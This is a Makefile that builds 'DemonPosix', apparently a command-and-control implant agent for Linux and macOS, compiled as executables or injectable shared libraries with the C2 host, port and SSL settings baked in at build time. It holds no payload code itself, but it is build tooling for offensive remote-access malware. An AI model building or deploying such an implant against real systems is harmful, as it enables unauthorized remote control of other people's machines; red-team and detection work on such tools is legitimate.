# DemonPosix makefile
# ───────────────────────────────────────────────────────────────────────
# Builds the POSIX Demon agent for Linux (x64/arm64) and macOS (x64/arm64).
#
# Usage:
#   make                         # Linux x64 ELF executable
#   make TARGET=linux-so         # Linux x64 shared library
#   make TARGET=macos-exe        # macOS x64 Mach-O executable
#   make TARGET=macos-dylib      # macOS x64 dynamic library
#   make ARCH=arm64              # cross-compile for ARM64
#   make DEBUG=1                 # debug build with symbols
#
# Required before building:
#   Linux:  apt install gcc libcurl4-openssl-dev
#   macOS:  brew install curl    (system clang is used)
#
# C2 config — pass as make variables:
#   make CONFIG_HOST=192.168.1.1 CONFIG_PORT=443 CONFIG_SSL=1

# ── Compiler detection ──────────────────────────────────────────────────
CC_LINUX_X64   ?= gcc
CC_LINUX_ARM64 ?= aarch64-linux-gnu-gcc
CC_MACOS       ?= clang

# ── Build target ────────────────────────────────────────────────────────
TARGET  ?= linux-exe
ARCH    ?= x64
DEBUG   ?= 0

# ── C2 defaults (override on command line) ──────────────────────────────
CONFIG_HOST ?= 127.0.0.1
CONFIG_PORT ?= 80
CONFIG_URI  ?= /
CONFIG_SSL  ?= 0

# ── Paths ───────────────────────────────────────────────────────────────
SRC_DIRS := src/core src/crypt src/inject src/main
INC_DIRS := include

SOURCES  := $(foreach d,$(SRC_DIRS),$(wildcard $(d)/*.c))
INCLUDES := $(foreach d,$(INC_DIRS),-I$(d))

DEFINES  := \
  -DCONFIG_HOST=\"$(CONFIG_HOST)\" \
  -DCONFIG_PORT=$(CONFIG_PORT) \
  -DCONFIG_URI=\"$(CONFIG_URI)\" \
  -DCONFIG_SSL=$(CONFIG_SSL)

ifeq ($(DEBUG),1)
  DEFINES  += -DDEBUG
  OPT_FLAGS := -g -O0
else
  OPT_FLAGS := -Os -s
endif

COMMON_FLAGS := -std=c11 -Wall -Wno-unused-result -Wno-format $(INCLUDES) $(DEFINES) $(OPT_FLAGS)

# ── Target-specific settings ─────────────────────────────────────────────
ifeq ($(TARGET),linux-exe)
  CC        := $(if $(filter arm64,$(ARCH)),$(CC_LINUX_ARM64),$(CC_LINUX_X64))
  CFLAGS    := $(COMMON_FLAGS) -fPIE -fstack-protector
  LDFLAGS   := -Wl,-z,relro,-z,now -pie -lcurl -lpthread
  OUTPUT    := demon_posix
endif

ifeq ($(TARGET),linux-so)
  CC        := $(if $(filter arm64,$(ARCH)),$(CC_LINUX_ARM64),$(CC_LINUX_X64))
  CFLAGS    := $(COMMON_FLAGS) -fPIC -DDEMON_SO
  LDFLAGS   := -shared -lcurl -lpthread
  OUTPUT    := demon_posix.so
endif

ifeq ($(TARGET),macos-exe)
  CC        := $(CC_MACOS)
  ARCH_FLAG := $(if $(filter arm64,$(ARCH)),-arch arm64,-arch x86_64)
  CFLAGS    := $(COMMON_FLAGS) $(ARCH_FLAG) -mmacosx-version-min=10.15
  LDFLAGS   := -lcurl -lpthread $(ARCH_FLAG)
  OUTPUT    := demon_posix
endif

ifeq ($(TARGET),macos-dylib)
  CC        := $(CC_MACOS)
  ARCH_FLAG := $(if $(filter arm64,$(ARCH)),-arch arm64,-arch x86_64)
  CFLAGS    := $(COMMON_FLAGS) $(ARCH_FLAG) -fPIC -DDEMON_SO -mmacosx-version-min=10.15
  LDFLAGS   := -dynamiclib -lcurl -lpthread $(ARCH_FLAG)
  OUTPUT    := demon_posix.dylib
endif

# ── Build rule ───────────────────────────────────────────────────────────
.PHONY: all clean install

all: $(OUTPUT)

$(OUTPUT): $(SOURCES)
	@echo "[*] Building DemonPosix (target=$(TARGET) arch=$(ARCH) debug=$(DEBUG))"
	@echo "[*] C2: $(CONFIG_HOST):$(CONFIG_PORT)$(CONFIG_URI) ssl=$(CONFIG_SSL)"
	$(CC) $(CFLAGS) $(SOURCES) -o $@ $(LDFLAGS)
	@echo "[+] Output: $@"

clean:
	rm -f demon_posix demon_posix.so demon_posix.dylib

install: all
	install -m 755 $(OUTPUT) /usr/local/bin/$(OUTPUT)
